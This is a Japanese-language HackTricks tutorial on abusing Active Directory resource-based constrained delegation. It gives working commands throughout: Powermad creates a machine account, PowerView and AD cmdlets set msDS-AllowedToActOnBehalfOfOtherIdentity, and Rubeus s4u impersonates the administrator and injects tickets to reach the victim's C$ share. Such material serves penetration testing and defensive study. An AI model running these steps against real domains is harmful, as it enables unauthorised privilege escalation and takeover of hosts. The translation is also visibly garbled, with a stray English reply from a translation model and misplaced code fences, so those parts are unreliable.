# リソースベースの制約付き委任

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>

## リソースベースの制約付き委任の基本

これは基本的な[制約付き委任](constrained-delegation.md)に似ていますが、**代わりに** **オブジェクト**に**任意のユーザーをサービスに対して偽装する**権限を与えるのではなく、リソースベースの制約付き委任は**そのオブジェクトに対して任意のユーザーを偽装できる者を設定します**。

この場合、制約されたオブジェクトには、それに対して任意のユーザーを偽装できるユーザーの名前が含まれる属性 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ があります。

この制約付き委任と他の委任とのもう一つの重要な違いは、**マシンアカウントに対する書き込み権限**(_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_)を持つ任意のユーザーが _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ を設定できることです（他の委任形式ではドメイン管理者権限が必要でした）。

### 新しい概念

制約付き委任では、ユーザーの _userAccountControl_ 値内の **`TrustedToAuthForDelegation`** フラグが **S4U2Self** を実行するために必要だと説明されました。しかし、それは完全に正しいわけではありません。\
実際には、その値がなくても、**サービス**（SPNを持っている）であれば、任意のユーザーに対して **S4U2Self** を実行できますが、**`TrustedToAuthForDelegation`** を**持っている**場合、返されるTGSは **Forwardable** になり、**持っていない**場合、返されるTGSは **Forwardable** に**なりません**。

しかし、**S4U2Proxy** で使用される **TGS** が **NOT Forwardable** の場合、**基本的な制約付き委任**を悪用しようとしても**機能しません**。しかし、**リソースベースの制約付き委任を悪用しようとする場合、機能します**（これは脆弱性ではなく、どうやら機能です）。

### 攻撃構造

> **コンピューター**アカウントに対する**書き込みに相当する権限**を持っていれば、そのマシンで**特権アクセス**を得ることができます。

攻撃者がすでに被害者コンピューターに対する**書き込みに相当する権限**を持っていると仮定します。

1. 攻撃者は**SPN**を持つアカウントを**侵害する**か、**作成する**（「サービスA」）。**任意の**_管理ユーザー_は、他の特別な権限なしで、最大10個の**コンピューターオブジェクト（**_**MachineAccountQuota**_**）**を**作成**し、それに**SPN**を設定できます。したがって、攻撃者はコンピューターオブジェクトを作成し、SPNを設定するだけです。
2. 攻撃者は、被害者コンピューター（サービスB）に対する**WRITE権限を悪用**して、**リソースベースの制約付き委任を設定し、ServiceAが任意のユーザーをその被害者コンピューター（サービスB）に対して偽装できるようにします**。
3. 攻撃者はRubeusを使用して、サービスBに対する特権アクセスを持つユーザーに対して、サービスAからサービスBへの**完全なS4U攻撃**（S4U2SelfおよびS4U2Proxy）を実行します。
   1. S4U2Self（侵害された/作成されたSPNアカウントから）：**私に対する管理者のTGSを要求する**（Forwardableではない）。
   2. S4U2Proxy：前のステップの**ForwardableでないTGS**を使用して、**被害者ホスト**に対する**管理者のTGS**を要求する。
   3. ForwardableでないTGSを使用していても、リソースベースの制約付き委任を悪用しているため、機能します。
4. 攻撃者は**チケットを渡す**ことができ、ユーザーになりすまして**被害者サービスBへのアクセスを得る**ことができます。

ドメインの_**MachineAccountQuota**_を確認するには、次を使用できます：
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピュータオブジェクトの作成

ドメイン内に[Powermad](https://github.com/Kevin-Robertson/Powermad)を使用してコンピュータオブジェクトを作成できます。
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Since there is no text provided other than the image markdown, there is nothing to translate. If you have specific text you would like translated, please provide it.
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### リソースベースの制約付き委任の設定

**activedirectory PowerShellモジュールを使用して**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
![](../../.gitbook/assets/B2.png)

**powerviewを使用する**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### S4U攻撃を完全に実行する

まず、`123456`のパスワードで新しいコンピューターオブジェクトを作成したので、そのパスワードのハッシュが必要です：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
これにより、そのアカウントのRC4およびAESハッシュが表示されます。
次に、攻撃を実行できます：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeusの`/altservice`パラメータを使用して、一度のリクエストで複数のチケットを生成することができます：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
ユーザーには "**Cannot be delegated**" という属性があることに注意してください。ユーザーがこの属性を True に設定している場合、そのユーザーを偽装することはできません。このプロパティはbloodhound内で確認できます。
{% endhint %}

![](../../.gitbook/assets/B3.png)

### アクセス

最後のコマンドラインは、**完全なS4U攻撃を実行し、Administratorから被害者ホストの**メモリ**にTGSを注入します。**\
この例では、Administratorから**CIFS**サービスのTGSが要求されたので、**C$**にアクセスできるようになります：
```bash
ls \\victim.domain.local\C$
```
```markdown
![](../../.gitbook/assets/b4.png)

### 異なるサービスチケットの悪用

[**利用可能なサービスチケットについてこちらで学ぶ**](silver-ticket.md#available-services)。

## Kerberos エラー

* **`KDC_ERR_ETYPE_NOTSUPP`**: これは、kerberosがDESまたはRC4を使用しないように設定されており、あなたが提供しているのがRC4ハッシュのみであることを意味します。Rubeusには少なくともAES256ハッシュを提供するか（またはrc4、aes128、およびaes256ハッシュを提供してください）。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: これは、現在のコンピュータの時刻がDCの時刻と異なり、kerberosが正常に動作していないことを意味します。
* **`preauth_failed`**: これは、指定されたユーザー名 + ハッシュがログインに使用できないことを意味します。ハッシュを生成する際にユーザー名に"$"を入れ忘れている可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）
* **`KDC_ERR_BADOPTION`**: これは以下を意味する可能性があります:
* 偽装しようとしているユーザーが望ましいサービスにアクセスできない（偽装できないか、十分な権限がないため）
* 要求されたサービスが存在しない（winrmのチケットを要求するがwinrmが実行されていない場合）
* 作成されたfakecomputerが脆弱なサーバーに対する権限を失っており、それらを戻す必要がある。

## 参考文献

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* **HackTricks**の[**githubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>
```
